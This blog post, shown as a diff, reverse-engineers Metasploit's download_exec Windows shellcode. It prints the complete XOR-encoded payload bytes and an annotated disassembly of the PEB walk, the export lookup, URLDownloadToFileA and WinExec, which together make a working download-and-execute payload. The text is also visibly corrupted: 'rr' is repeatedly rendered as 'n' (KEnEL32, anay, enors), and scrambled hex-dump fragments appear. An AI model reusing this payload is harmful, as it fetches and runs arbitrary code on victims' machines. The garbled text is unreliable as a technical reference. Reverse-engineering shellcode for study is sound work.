@@ -1,0 +1,487 @@
+This is not anything new and exciting¹, and should hopefully be familiar to some of you reading this.
+Some time ago I reversed the shellcode from Metasploit's download_exec module.
+It's a bit different from the rest of the stuff in MSF, because there's no source code with it, and it lacks certain features that the other shellcode[s] have (like being able to set the exit function).
+When I started writing this blog post, the day before yesterday, I looked into the history of this particular scrap of code…
+It's very similar to lion's downloadurl_v31.c available here: http://www.exploit-db.com/exploits/13529/.
+… Except that, that code seems to be a more recent version than the code in MSF.
+For example, that does the LSD-PL function name hash trick, rather than lug around the full function names for look-up (as the version in MSF does.)
+So, lion was a major figure in the Chinese 红客 Honker scene — literally translated as Red Guest (or Red Visitor or Red Passenger).
+(Basically Hackers who are also Chinese nationalists.)
+His group was the Honker Union of China [HUC], http://www.cnhonker.com — this site seems to have been dead for a while.
+He wrote a lot of code back in 2003 and 2004.
+(我现在明白了一些在写这个汉字!)
+I managed to dig up an older version of this 'downloadurl' code dated 2003-09-01 which is closer to the code in MSF.
+http://www.cnhonker.com/index.php?module=releases&act=view&type=3&id=41 [archive] The code credits ey4s (from XFocus I think) for the actual shellcode.
+Anyway, big chunks of this code, like the whole PEB method, also look like they were directly copied from Skape's old stuff (Dec 2003) — which was copied from Dino Dai Zovi (Apr 2003) — which was copied from Ratter/29A (Mar 2002) etc.
+etc.
+Like I said, this is all very old stuff.
+None of it has really changed since 2002, and it's still in very common use.
+pita's contribution to all this appears to be wrapping up the blob of code
+output by the lion program above into a MSF2 module:
+What is the plural of the word shellcode?
+Neither shellcodes nor shellscode sound right.
+I believe that the word shellcode is a mass noun, so it's the same singular as plural.
+(Or at the very least, it only sounds right as a plural when used with a plural verb.)
+If I have some shellcode, and I add some more shellcode to that, then I still have some shellcode, more shellcode than before.
+Bob has one shellcode.
+Alice wrote three shellcode.
+Malory has a lot of shellcode.
+Bob has one shellcode.
+Alice wrote three shellcodes.
+Malory has a lot of shellcodes.
+Here is shellcode.
+← Sounds ok to me.
+Here is a shellcode.
+← No, sounds wrong.
+Here is some shellcode.
+← Sounds ok to me.
+Here is some shellcodes.
+← No, sounds wrong.
+Here are some shellcode.
+← Doesn't sound right either.
+Here are some shellcodes.
+← Sounds ok to me.
+Let's take a look at the MSF code
+## # This file is part of the Metasploit Framework and may be subject to
+'Platform' => 'win',
+'Arch' => ARCH_X86,
+'Privileged' => false,
+'Offsets' => { },
+The decoder is self-explanatory, so I don't know why I'm explaining it, anyway… It finds where it is in memory, XORs the encrypted code right after it, and then runs the decrypted code.
+0002 5A pop edx ; EDX points to the star
+; of the encoded shellcod
+0003 4A dec edx ; The LOOP exits at ECX=0,
+; so XOR [EDX+0],0x99 never
+; happens (Last XOR is [EDX+1])
+0004 33C9 xor ecx,ecx ; ECX = 0
+0006 66B93C01 mov cx,0x13c ; Shellcode length = 0x13C
+000A 80340A99 xor byte [edx+ecx],0x99 ; Encoder/Decoder (xor) Key=0x99
+000E E2FA loop 0xa ; XOR each byte from the end
+; to the begining
+0010 EB05 jmp short 0x17 ; Run decoded shellcode
+0012 E8EBFFFFFF call 0x2 ; PUSH EIP
+0017 ... ; Start of shellcode
+Here's the decrypted shellcode, side by side with the original.
+"\x70\x4C\x99\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"+ #000 e9 d5 00 00 00 5a 64 a1 30 00 00 00 8b 40 0c 8b |[email protected]|
+"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"+ #010 70 1c ad 8b 40 08 8b d8 8b 73 3c 8b 74 1e 78 03 |[email protected]<.t.x.|
+"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"+ #020 f3 8b 7e 20 03 fb 8b 4e 14 33 ed 56 57 51 8b 3f |..~ ...N.3.VWQ.
+?|
+"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"+ #030 03 fb 8b f2 6a 0e 59 f3 a6 74 08 59 5f 83 c7 04 |....j.Y..t.Y_...|
+"xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"+ #040 45 e2 e9 59 5f 5e 8b cd 8b 46 24 03 c3 d1 e1 03 |E..Y_^...F$.....|
+"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"+ #050 c1 33 c9 66 8b 08 8b 46 1c 03 c3 c1 e1 02 03 c1 |.3.f...F........|
+"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9D\xC0"+ #060 8b 00 03 c3 8b fa 8b f7 83 c6 0e 8b d0 6a 04 59 |.............j.Y|
+"\x71\xC9\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"+ #070 e8 50 00 00 00 83 c6 0d 52 56 ff 57 fc 5a 8b d8 |.P......RV.W.Z..|
+"\xF3\x98\xC0\x71\xA4\x99\x99\x99\x1A\x5F\x8A\xCF\xDF\x19\xA7\x19"+ #080 6a 01 59 e8 3d 00 00 00 83 c6 13 56 46 80 3e 80 |j.Y.=......VF.>.|
+"\xEC\x63\x19\xAF\x19\xC7\x1A\x75\xB9\x12\x45\xF3\xB9\xCA\x66\xCE"+ #090 75 fa 80 36 80 5e 83 ec 20 8b dc 6a 20 53 ff 57 |u..6.^.. ..j S.W|
+"\x75\x5E\x9D\x9A\xC5\xF8\xB7\xFC\x5E\xDD\x9A\x9D\xE1\xFC\x99\x99"+ #0a0 ec c7 04 03 5c 61 2e 65 c7 44 03 04 78 65 00 00 |....a.e.D..xe..|
+"\xAA\x59\xC9\xC9\xCA\xCF\xC9\x66\xCE\x65\x12\x45\xC9\xCA\x66\xCE"+ #0b0 33 c0 50 50 53 56 50 ff 57 fc 8b dc 50 53 ff 57 |3.PPSVP.W...PS.W|
+"\x69\xC9\x66\xCE\x6D\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA"+ #0c0 f0 50 ff 57 f4 33 c0 ac 85 c0 75 f9 51 52 56 53 |.P.W.3....u.QRVS|
+"\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\xBF\x66\x66\x66\xDE"+ #0d0 ff d2 5a 59 ab e2 ee 33 c0 c3 e8 26 ff ff ff 47 |..ZY...3...&...G|
+"\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDE\xFC"+ #0e0 65 74 50 72 6f 63 41 64 64 72 65 73 73 00 47 65 |etProcAddress.Ge|
+"\xED\xCA\xE0\xEA\xED\xFC\xF4\xDD\xF0\xEB\xFC\xFA\xED\xF6\xEB\xE0"+ #0f0 74 53 79 73 74 65 6d 44 69 72 65 63 74 6f 72 79 |tSystemDirectory|
+"\xD8\x99\xCE\xF0\xF7\xDC\xE1\xFC\xFA\x99\xDC\xE1\xF0\xED\xCD\xF1"+ #100 41 00 57 69 6e 45 78 65 63 00 45 78 69 74 54 68 |A.WinExec.ExitTh|
+"\xEB\xFC\xF8\xFD\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0"+ #110 72 65 61 64 00 4c 6f 61 64 4c 69 62 72 61 72 79 |read.LoadLibrary|
+"\xD8\x99\xEC\xEB\xF5\xF4\xF6\xF7\x99\xCC\xCB\xD5\xDD\xF6\xEE\xF7"+ #120 41 00 75 72 6c 6d 6f 6e 00 55 52 4c 44 6f 77 6e |A.urlmon.URLDown|
+"\xF5\xF6\xF8\xFD\xCD\xF6\xDF\xF0\xF5\xFC\xD8\x99" #130 6c 6f 61 64 54 6f 46 69 6c 65 41 00 |loadToFileA.|
+# EXITFUNC is not supported :/
+# Register command execution options
+OptString.new('URL', [ true, "The pre-encoded URL to the executable" ])
+# Constructs the payload
+retun module_info['Payload']['Payload'] + (datastore['URL'] || '') + "\x80"
+The MSDN documentation on the PEB structure is rather lacking in detail.
+This is a bit more useful: PEB on NirSoft.net.
+Ditto for the MSDN info on _PEB_LDR_DATA
+This is better:PEB_LDR_DATA on NTIntenals.net,
+and this: PEB_LDR_DATA on NirSoft.net.
+The best information I've found on the structures is from using dt in kd.
+I originally drew this in ASCII, and then redrew this using the Unicode box drawing characters.
+But then I discovered that Firefox gets the font metrics completely wrong, so that box drawing characters, in a monospace font, are all different widths, so nothing lines up.
+← This is stupid.
+So it's 7-bit ASCII for now.
+(WebKit based browsers get it right, and so does lynx and links.)
+The first six instructions of the shellcode (after the EIP stuff) find KEnEL32.DLL's base address by walking down the following chain of structures.
+The FS segment register points to the _TEB for each executing thread.
+(Everyone remembers segment registers from the 16-bit days, right?)
+This is much simpler than keeping the pointer in memory somewhere, and then remembering where that memory was, etc.
+(It's also used to find the final exception handler if the program just can't cope.)
+This is also a clever optimization if you're going to be refening to stuff in the structure a lot.
+(Although FS:0 is uneachable from most C compilers, so inline assembly must be used.)
+The segment registers aren't used for much in userspace protected mode, so it doesn't contribute to register pressure.
+The _TEB usually lives around 0x7FFDF000 depending on a bunch of factors (like which version of Windows is used and how many threads).
+This technique assumes that KEnEL32.DLL is the first module loaded (first node in the InInitilizationOrder Module List).
+If not, it'll crash and bun.
+Since all of the shellcode you see these days (in drive-by exploits, etc) does this exact same PEB lookup trick.
+You can break them all just by loading a dummy DLL first, before KEnEL32.
+Windows 7 does this now, apparently on accident.
+For the uninitiated, I'll show you how this works…
++0x000 NtTib : _NT_TIB <- FS:0
++0x01c EnvironmentPointer : Ptr32 Void
++0x020 ClientId : _CLIENT_ID
++0x028 ActiveRpcHandle : Ptr32 Void
++0x02c ThreadLocalStoragePointer : Ptr32 Void
++0x030 ProcessEnvironmentBlock : Ptr32 _PEB -----┐
++0x034 LastEnorValue : Uint4B │
++0x038 CountOfOwnedCriticalSections : Uint4B │
+┌-------------------------------------------┘ MOV EAX, [FS:0x30]
++0x000 InheritedAddressSpace : UChar
++0x001 ReadImageFileExecOptions : UChar
++0x002 BeingDebugged : UChar
++0x003 SpareBool : UChar
++0x004 Mutant : Ptr32 Void
++0x008 ImageBaseAddress : Ptr32 Void
++0x00c Ldr : Ptr32 _PEB_LDR_DATA ---------------┐
++0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS │
++0x014 SubSystemData : Ptr32 Void │
++0x018 ProcessHeap : Ptr32 Void │
++0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION │
++0x020 FastPebLockRoutine : Ptr32 Void │
++0x024 FastPebUnlockRoutine : Ptr32 Void │
++0x028 EnvironmentUpdateCount : Uint4B │
++0x02c KenelCallbackTable : Ptr32 Void │
++0x030 SystemReserved : [1] Uint4B │
++0x034 AtlThunkSListPtr32 : Uint4B │
++0x038 FreeList : Ptr32 _PEB_FREE_BLOCK │
+┌-------------------------------------------------------------┘ MOV EAX, [EAX+0xC]
+nt!_PEB_LDR_DATA [AKA: "ProcessModuleInfo" or "PROCESS_MODULE_INFO"]
++0x000 Length : Uint4B
++0x004 Initialized : UChar
++0x008 SsHandle : Ptr32 Void
++0x00c InLoadOrderModuleList : _LIST_ENTRY
++0x014 InMemoryOrderModuleList : _LIST_ENTRY
++0x01c InInitializationOrderModuleList : _LIST_ENTRY -----┐
++0x024 EntryInProgress : Ptr32 Void │
+┌------------------------------------------------------┘ MOV ESI, [EAX+0x1C] ; LODSD
+│ nt!_LDR_DATA_TABLE_ENTRY [AKA: "_LDR_MODULE"]
+│ +0x000 InLoadOrderLinks : _LIST_ENTRY
+│ +0x000 Flink : Ptr32
+│ +0x004 Blink : Ptr32
+│ +0x008 InMemoryOrderLinks : _LIST_ENTRY
+│ +0x000 Flink : Ptr32
+│ +0x004 Blink : Ptr32
+│ +0x010 InInitializationOrderLinks : _LIST_ENTRY
+└-------> +0x000 Flink : Ptr32 -┐ This distance
++0x004 Blink : Ptr32 │ is eight bytes
++0x018 DllBase : Ptr32 Void -┘ DllBase → _IMAGE_DOS_HEADER
++0x01c EntryPoint : Ptr32 Void
++0x020 SizeOfImage : Uint4B
++0x024 FullDllName : _UNICODE_STRING
++0x02c BaseDllName : _UNICODE_STRING
++0x034 Flags : Uint4B
++0x038 LoadCount : Uint2B
++0x03a TlsIndex : Uint2B
++0x03c HashLinks : _LIST_ENTRY
++0x03c SectionPointer : Ptr32 Void
++0x040 CheckSum : Uint4B
++0x044 TimeDateStamp : Uint4B
++0x044 LoadedImports : Ptr32 Void
++0x048 EntryPointActivationContext : Ptr32 Void
++0x04c PatchInformation : Ptr32 Void
+So at this point, the shellcode knows where to find the first DLL file that was mapped into memory.
+Now it finds functions in the library in the same way that Windows does it.
+nt!_LDR_DATA_TABLE_ENTRY [AKA: "_LDR_MODULE"]
++0x000 InLoadOrderLinks : _LIST_ENTRY
++0x008 InMemoryOrderLinks : _LIST_ENTRY
++0x010 InInitializationOrderLinks : _LIST_ENTRY ← So EAX was pointing here…
++0x018 DllBase : Ptr32 Void -------------┐ MOV EAX, [EAX+0x8]
+┌--------------------------------------------------------┘ MOV EBX, EAX
+nt!_IMAGE_DOS_HEADER EBX points here, and is used for all Virtual Address offsets
++0x000 e_magic : Uint2B (usually "MZ")
++0x002 e_cblp : Uint2B
++0x004 e_cp : Uint2B
++0x006 e_crlc : Uint2B
++0x008 e_cparhdr : Uint2B
++0x00a e_minalloc : Uint2B
++0x00c e_maxalloc : Uint2B
++0x00e e_ss : Uint2B
++0x010 e_sp : Uint2B
++0x012 e_csum : Uint2B
++0x014 e_ip : Uint2B
++0x016 e_cs : Uint2B
++0x018 e_lfarlc : Uint2B
++0x01a e_ovno : Uint2B
++0x01c e_res : [4] Uint2B
++0x024 e_oemid : Uint2B
++0x026 e_oeminfo : Uint2B
++0x028 e_res2 : [10] Uint2B
++0x03c e_lfanew : Int4B -------┐ MOV ESI, [EBX+0x3C]
++0x000 Signature : Uint4B (usually "PE\0\0") --┐
++0x004 FileHeader : _IMAGE_FILE_HEADER │
++0x000 Machine : Uint2B │
++0x002 NumberOfSections : Uint2B │
++0x004 TimeDateStamp : Uint4B │
++0x008 PointerToSymbolTable : Uint4B │
++0x00c NumberOfSymbols : Uint4B │
++0x010 SizeOfOptionalHeader : Uint2B │
++0x012 Characteristics : Uint2B │ This distance is
++0x018 OptionalHeader : _IMAGE_OPTIONAL_HEADER │ 0x78 bytes long
++0x000 Magic : Uint2B │
++0x002 MajorLinkerVersion : UChar │
++0x003 MinorLinkerVersion : UChar │
++0x004 SizeOfCode : Uint4B │ (That's 0x18+0x60 bytes
++0x008 SizeOfInitializedData : Uint4B │ from the PE header to the
++0x00c SizeOfUninitializedData : Uint4B │ _IMAGE_DATA_DIRECTORY)
++0x010 AddressOfEntryPoint : Uint4B │
++0x014 BaseOfCode : Uint4B │
++0x018 BaseOfData : Uint4B │
++0x01c ImageBase : Uint4B │
++0x020 SectionAlignment : Uint4B │
++0x024 FileAlignment : Uint4B │
++0x028 MajorOperatingSystemVersion : Uint2B │
++0x02a MinorOperatingSystemVersion : Uint2B │
++0x02c MajorImageVersion : Uint2B │
++0x02e MinorImageVersion : Uint2B │
++0x030 MajorSubsystemVersion : Uint2B │
++0x032 MinorSubsystemVersion : Uint2B │
++0x034 Win32VersionValue : Uint4B │
++0x038 SizeOfImage : Uint4B │
++0x03c SizeOfHeaders : Uint4B │
++0x040 CheckSum : Uint4B │
++0x044 Subsystem : Uint2B │
++0x046 DllCharacteristics : Uint2B │
++0x048 SizeOfStackReserve : Uint4B │
++0x04c SizeOfStackCommit : Uint4B │
++0x050 SizeOfHeapReserve : Uint4B │
++0x054 SizeOfHeapCommit : Uint4B │
++0x058 LoaderFlags : Uint4B │
++0x05c NumberOfRvaAndSizes : Uint4B │
++0x060 DataDirectory : [16] _IMAGE_DATA_DIRECTORY -┘ MOV ESI, [ESI+EBX+0x78]; ADD ESI, EBX
+/ (This isn't exactly kd output, I've fabricated it.)
+nt!_IMAGE_DATA_DIRECTORY Export Table
++0x060 +0x000 VirtualAddress : Uint4B RVA of the table - Relative to Base Address (EBX)
++0x064 +0x004 Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY Import Table
++0x068 +0x008 VirtualAddress : Uint4B
+[etc.]
++0x00c Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY Resource Table
++0x010 VirtualAddress : Uint4B
++0x014 Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY Exception Table
++0x018 VirtualAddress : Uint4B
++0x01c Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY Certificate Table
++0x020 VirtualAddress : Uint4B
++0x024 Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY Base Relocation Table
++0x028 VirtualAddress : Uint4B
++0x02c Size : Uint4B
++0x030 VirtualAddress : Uint4B
++0x034 Size : Uint4B
++0x038 VirtualAddress : Uint4B
++0x03c Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY Global Ptr
++0x040 VirtualAddress : Uint4B
++0x044 Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY TLS Table
++0x048 VirtualAddress : Uint4B
++0x04c Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY Load Config Table
++0x050 VirtualAddress : Uint4B
++0x054 Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY Bound Import
++0x058 VirtualAddress : Uint4B
++0x05c Size : Uint4B
++0x060 VirtualAddress : Uint4B
++0x064 Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY Delay Import Descriptor
++0x068 VirtualAddress : Uint4B
++0x06c Size : Uint4B
+nt!_IMAGE_DATA_DIRECTORY CLR Runtime Header
++0x070 VirtualAddress : Uint4B
++0x074 Size : Uint4B
++0x078 VirtualAddress : Uint4B
++0x07c Size : Uint4B
+Now where were we...
+nt!_IMAGE_DATA_DIRECTORY Export Table
++0x000 VirtualAddress : Uint4B -----┐ MOV ESI, [ESI+EBX+0x78] ; ADD ESI, EBX
++0x004 Size : Uint4B │
++0x000 Characteristics : Uint4B
++0x004 TimeDateStamp : Uint4B
++0x008 MajorVersion : Uint2B Number of Names or Functions in EAT
++0x00a MinorVersion : Uint2B Because of aliasing, these can be different values.
++0x00c Name : Uint4B The shellcode uses the wrong one for the name lookup loop.
++0x010 Base : Uint4B
++0x014 NumberOfFunctions : Uint4B ------ MOV ECX, [ESI+0x14]
++0x018 NumberOfNames : Uint4B
++0x01c AddressOfFunctions : Uint4B
++0x020 AddressOfNames : Uint4B -----┐ MOV EDI, [ESI+0x20] ; ADD EDI, EBX
++0x024 AddressOfNameOrdinals : Uint4B │
+│ The Export Name Table is just an
+│ anay of pointers to C-style strings.
+│ The Ordinal table uses the exact
+│ same anay indexes.
+│ As a concrete example, I'm using RVA values from the WinXP SP2 English KEnEL32.DLL
+│ The base address of this DLL is 0x77E80000, so EBX will be pointing there in the code below.
+│ Base Address + RVA = Actual Virtual Address in memory (Most of the time)
+EDI↓ AddressOfNames=0x577B2 AddressOfNameOrdinals=0x57144 AddressOfFunctions=0x56468
+name[ 0]=0x5849B → "AddAtomA\0" ordinal[ 0]=0x0000 function[0x0000]=0x0000932E
+name[ 1]=0x584A4 → "AddAtomW\0" ordinal[ 1]=0x0001 function[0x0001]=0x00009BC4
+name[ 2]=0x584AD → "AddConsoleAliasA\0" ordinal[ 2]=0x0002 function[0x0002]=0x00044457
+name[ 3]=0x584BE → "AddConsoleAliasW\0" ordinal[ 3]=0x0003 function[0x0003]=0x00044420
+name[ 4]=0x584CF → "AllocConsole\0" ordinal[ 4]=0x0004 function[0x0004]=0x0004520E
+name[ 5]=0x584DC → "AllocateUserPhysicalPages\0" ordinal[ 5]=0x0005 function[0x0005]=0x000339D6
+name[ 6]=0x584F6 → "AreFileApisANSI\0" ordinal[ 6]=0x0006 function[0x0006]=0x00018678
+name[ 7]=0x58506 → "AssignProcessToJobObject\0" ordinal[ 7]=0x0007 function[0x0007]=0x00043BAE
+name[ 8]=0x5851F → "BackupRead\0" ordinal[ 8]=0x0008 function[0x0008]=0x00029776
+name[ 9]=0x5852A → "BackupSeek\0" ordinal[ 9]=0x0009 function[0x0009]=0x000299D2
+name[ 10]=0x58535 → "BackupWrite\0" ordinal[ 10]=0x000A function[0x000A]=0x0002A2FA
+name[ 11]=0x58541 → "BaseAttachCompleteThunk\0" ordinal[ 11]=0x000B function[0x000B]=0x00028916
+name[ 12]=0x58559 → "Beep\0" ordinal[ 12]=0x000C function[0x000C]=0x0002A518
+[...] [...] [...]
+name[339]=0x59DA5 → "GetProcAddress\0" ordinal[339]=0x0153 function[0x0153]=0x0001564B
+[...] [...] [...]
+name[821]=0x5BEA9 → "lstrlenA\0" ordinal[821]=0x0335 function[0x0335]=0x00017334
+name[822]=0x5BEB2 → "lstrlenW\0" ordinal[822]=0x0336 function[0x0336]=0x0000CD5C
+║ ⇑ ║ ⇑
+; So this loop walks down the AddressOfNames anay, doing string comparisons with the strings stored at
+; the end of the shellcode.
+It keeps track of how many iterations the loop has gone through through,
+; which will be the ordinal number when the loop exits.
+; (The left half of the diagram above.)
+; EDI and ECX get clobbered for the REPE CMPSB op
+push edi ; 57 ; AddressOfNames Anay Stack: EDI
+push ecx ; 51 ; NumberOfFunctions left to go Stack: ECX EDI
+mov edi, [edi] ; 8B 3F ; EDI points to start of a Name String
+add edi, ebx ; 03 FB ; RVA to VA conversion
+mov esi, edx ; 8B F2 ; EDX points to string table at end of shellcode "GetProcAddress" etc.
+push byte +0xe ; 6A 0E ; Only compare the first fourteen chars
+pop ecx ; 59 ; ECX = 0xE
+repe cmpsb ; F3 A6 ; Compare [ESI] with [EDI]
+jz Exitloop ; 74 08 ; If we've found the string, we're done
+pop ecx ; 59 ; NumberOfFunctions left to check.
+Stack: EDI
+pop edi ; 5F ; Curent Index of AddressOfNames Anay
+add edi, byte +0x4 ; 83 C7 04 ; Next AddressOfNames pointer
+inc ebp ; 45 ; Ordinal / AddressOfNames Anay index
+loop NameToOrdinal ; E2 E9 ;
+; This code finds the function's address using the ordinal
+; (The center half of the diagram above.)
+mov ecx, ebp ; 8B CD ; EBP = Ordinal (AddressOfNames Anay index)
+mov eax, [esi+0x24] ; 8B 46 24 ; AddressOfNameOrdinals RVA
+add eax, ebx ; 03 C3 ; RVA to VA conversion
+shl ecx, 1 ; D1 E1 ; Ordinal * 2
+add eax, ecx ; 03 C1 ; EAX = (*AddressOfNameOrdinals) + (Ordinal * 2)
+; to put in another way EAX = &AddressOfNameOrdinals[Ordinal]
+xor ecx, ecx ; 33 C9 ; ECX = 0
+mov cx, [eax] ; 66 8B 08 ; CX = Ultimate Index (FunctionOrdinal) into AddressOfFunctions
+; (The right half of the diagram above.)
+(Yes I know that's three halves.)
+mov eax, [esi+0x1c] ; 8B 46 1C ; AddressOfFunctions RVA
+add eax, ebx ; 03 C3 ; RVA to VA conversion
+shl ecx, 0x2 ; C1 E1 02 ; FunctionOrdinal * 4
+add eax, ecx ; 03 C1 ; EAX = (*AddressOfFunctions) + (FunctionOrdinal * 4)
+; alt.
+EAX = &AddressOfFunctions[AddressOfNameOrdinals[Ordinal]]
+mov eax, [eax] ; 8B 00 ; EAX = RVA of function (ta-da)
+add eax, ebx ; 03 C3 ; RVA to VA conversion
+The rest of the functions from KEnEL32.DLL which the shellcode uses are looked up with GetProcAddress() in a loop.
+Each function address is stored on top of the strings at the end of the shellcode.
+(i.e.
+It overwrites "GetProcAddress\0GetSystemDirectoryA\0" …etc.)
+mov esi, edi ; 8B F7 ; And so now EDI and ESI point there too
+add esi, byte +0xe ; 83 C6 0E ; "GetProcAddress" is 0xE bytes long, skip it.
+mov edx, eax ; 8B D0 ; The address of GetProcAddress()
+push byte +0x4 ; 6A 04 ; Number of names (after "GetProcAddress") to lookup in KEnEL32
+pop ecx ; 59 ; ECX = 4 names to lookup
+call GetFunctions ; E8 50000000 ; ------
+; FARPROC WINAPI GetProcAddress(
+; __in HMODULE hModule,
+; __in LPCSTR lpProcName
+xor eax,eax ; 33C0 ; EAX = 0
+lodsb ; AC ; EAX = byte [ESI] assumes DF=0 I guess
+test eax,eax ; 85C0 ; Check if at end of function name string
+jnz Getfunctions ; 75F9 ; The loop advances ESI to the end of
+; this sting and start of next
+push ecx ; 51 ; Loop counter: 4,3,2,1
+push edx ; 52 ; GetProcAddress function address
+push esi ; 56 ; lpProcName = ESI = Start of name string in list
+push ebx ; 53 ; hModule = KEnEL32 base address or URLMON base address
+; GetProcAddress(hModule [in], lpProcName [in])
+call edx ; FFD2 ; EAX = GetProcAddress(EBX, ESI)
+pop edx ; 5A ; GetProcAddress function address
+pop ecx ; 59 ; Loop counter: 4,3,2,1
+stosd ; AB ; Store Function Pointer, EAX, at [EDI]
+loop Getfunctions ; E2EE ; Lather, rinse, repeat
+xor eax,eax ; 33C0 ; Retun zero upon success?
+ret ; C3 ; _______________________________________
+db "GetProcAddress",0 ; EDI starts at this address.
+db "GetSystemDirectoryA",0 ; After loading URLMON becomes [edi-0x14]
+db "WinExec",0 ; After loading URLMON becomes becomes [edi-0x10]
+db "ExitThread",0 ; After loading URLMON becomes becomes [edi-0x0C]
+db "LoadLibraryA",0 ; [edi-0x04] After loading URLMON becomes becomes [edi-0x08]
+add esi, byte +0xd ; 83C60D ; ESI was at start of "LoadLibraryA\0" which is 0xD long
+push edx ; 52 ; GetProcAddress function address
+push esi ; 56 ; lpFileName = ESI point to "urlmon\0"
+call near [edi-0x4] ; FF57FC ; EAX = LoadLibrary(ESI)
+; HMODULE WINAPI LoadLibrary(
+; __in LPCTSTR lpFileName
+pop edx ; 5A ; GetProcAddress function address
+mov ebx, eax ; 8B D8 ; Handle to URLMON module
+push byte +0x1 ; 6A 01 ; Number of names to lookup in URLMON.DLL
+pop ecx ; 59 ; ECX = 1 name to lookup
+call Getfunctions ; E8 3D000000 ; ------
+add esi, byte +0x13 ; 83 C6 13 ; ESI was at "URLDownloadToFileA\0" so move past it
+push esi ; 56 ; szURL = ESI points to URL
+db "urlmon",0 ;
+db "URLDownloadToFileA",0 ; becomes [edi-0x04]
+The URL is terminated with a 0x80 byte rather than a 0x00.
+As this URL string is never encoded; It's probably an attempt to avoid null bytes, even to the very end!
+inc esi ; 46 ; Next letter of URL
+cmp byte [esi],0x80 ; 803E80 ; Is it the end?
+jnz strlen_80 ; 75FA ;
+xor byte [esi],0x80 ; 803680 ; At end of URL, change 0x80 into a 0x00
+pop esi ; 5E ; szURL = ESI points to URL
+This just gets the path to the System32 directory.
+; UINT WINAPI GetSystemDirectory(
+; __out LPTSTR lpBuffer
+; __in UINT uSize
+sub esp, byte +0x20 ; 83EC20 ; Make some space for the string on the stack
+mov ebx, esp ; 8BDC ; EBX = lpBuffer
+push byte +0x20 ; 6A20 ; uSize = 0x20 bytes
+push ebx ; 53 ; lpBuffer (0x20 bytes on stack)
+call near [edi-0x14] ; FF57EC ; EAX = string length = GetSystemDirectoryA(EBX, 0x20)
+The string "\\a.exe" is appended onto the end of whatever GetSystemDirectory() retuned, and the downloaded file from the URL is written to that.
+; HRESULT URLDownloadToFile( LPUNKNOWN pCaller
+; LPCTSTR szURL,
+; LPCTSTR szFileName,
+; DWORD dwReserved,
+; LPBINDSTATUSCALLBACK lpfnCB
+mov dword [ebx+eax], 0x652e615c ; C704035C612E65 ; lpBuffer + length = "\\a.e"
+mov dword [ebx+eax+0x4], 0x6578 ; C744030478650000 ; lpBuffer + length + 4 = "ex"
+xor eax, eax ; 33C0 ; EAX = 0 if that wasn't obvious
+push eax ; 50 ; lpfnCB = 0
+push eax ; 50 ; dwReserved = 0
+push ebx ; 53 ; szFileName = %systemdir%\a.exe
+push esi ; 56 ; szURL = URL at end of shellcode
+push eax ; 50 ; pCaller = 0
+call near [edi-0x4] ; FF57FC ; URLDownloadToFileA(0, ESI, EBX, 0, 0);
+Y'all know what's coming next... WinExec!
+; UINT WINAPI WinExec(
+; __in LPCSTR lpCmdLine,
+; __in UINT uCmdShow
+mov ebx,esp ; 8B DC ; EBX points to %systemdir%\a.exe
+push eax ; 50 ; uCmdShow = either S_OK or E_OUTOFMEMORY or INET_E_DOWNLOAD_FAILURE
+; I think what is intended is uCmdShow = 0
+push ebx ; 53 ; lpCmdLine = %systemdir%\a.exe
+call near [edi-0x10] ; FF57F0 ; WinExec("%systemdir%\\a.exe",0);
+And that's it, we're basically done, so exit.
+Note, if someone wanted to fix the EXITFUNC feature for this in MSF, you can either store ExitThread or ExitProcess
+in the string table (the arguments are the same, but their lengths are off by one.)
+or modify the shellcode logic itself.
+I'm very tempted to make the changes myself, but I've got a bunch of other stuff I need to get done this week.
+(The easiest, but least elegant fix is to just swap out all the encoded strings starting at 0x10A and going all the way to the end.)
+; VOID WINAPI ExitThread(
+; __in DWORD dwExitCode
+push eax ; 50 ; EnOR_BAD_FORMAT or EnOR_FILE_NOT_FOUND or one
+; of the other things WinExec() might retun.
+; It's 32 or over on success
+call near [edi-0xc] ; FF57F4 ; ExitThread(EAX)
+Let me know if I've made any enors in this write up.
+I was too lazy to check most of this out in a debugger; It's all come directly out of my head.
+I've put an easy-to-assemble version of all this here:
+Note that NASM uses the altenative instruction encodings for some x86 opcodes, so you won't get the exact same binary out of NASM as the original in MSF.
+If you don't know what this means, then don't wony, I'll explain it later.
+Why does the shellcode use GetProcAddress() to look up the rest of the function names instead of the code which looked up "GetProcAddress" from the KEnEL32.DLL export table in the first place?
+What other shellcode has the same NumberOfFunctions verses NumberOfNames usage bug as this?
+What other shellcode uses %systemdir%\a.exe verses something else.
+What happens if URLDownloadToFileA() fails?
